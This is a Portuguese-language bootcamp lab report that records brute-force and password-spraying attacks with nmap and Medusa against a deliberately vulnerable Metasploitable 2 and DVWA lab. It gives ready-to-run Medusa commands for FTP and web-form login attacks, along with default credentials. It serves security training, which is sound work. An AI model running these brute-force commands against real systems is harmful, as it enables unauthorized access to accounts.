# 📸 Resultados do Laboratório – Simulação de Ataques com Medusa

Este documento reúne todas as evidências visuais do laboratório executado no Kali Linux contra o Metasploitable 2, seguindo o desafio do Bootcamp Santander Cibersegurança 2025 – DIO.

---

## 🔍 1. Reconhecimento com Nmap

**Arquivo:** `nmap_scan.png`

Nesta etapa, realizamos um scan no alvo para identificar portas e serviços vulneráveis.

Comando utilizado:

```
nmap -sV 192.168.56.101
```

---

## 🛠️ 2. Ataque de Força Bruta em FTP (Medusa)

**Arquivos:** `ftp_bruteforce_success.png` `ftp_bruteforce_success_2`

Comando utilizado:

```
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
```
```
ftp 192.168.56.103
User: msfadmin / password: msfadmin
```
---

## 🕸️ 3. Ataque de Força Bruta Web – DVWA

**Arquivos:** `dvwa_medusa_success.png` `dvwa_medusa_success_2.png`

Comando:

```
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

---

## 📁 4. Password Spraying em SMB

**Arquivo:** `smb_spray.png`

Comando:

```
./spray_smb.sh
```

---

## 🧩 5. Estrutura Final do Projeto

**Arquivo:** `project_structure.png`

---

## ✅ Conclusão

O laboratório demonstrou com sucesso ataques de força bruta, password spraying e identificação de serviços vulneráveis usando o Medusa, em ambiente seguro e isolado.
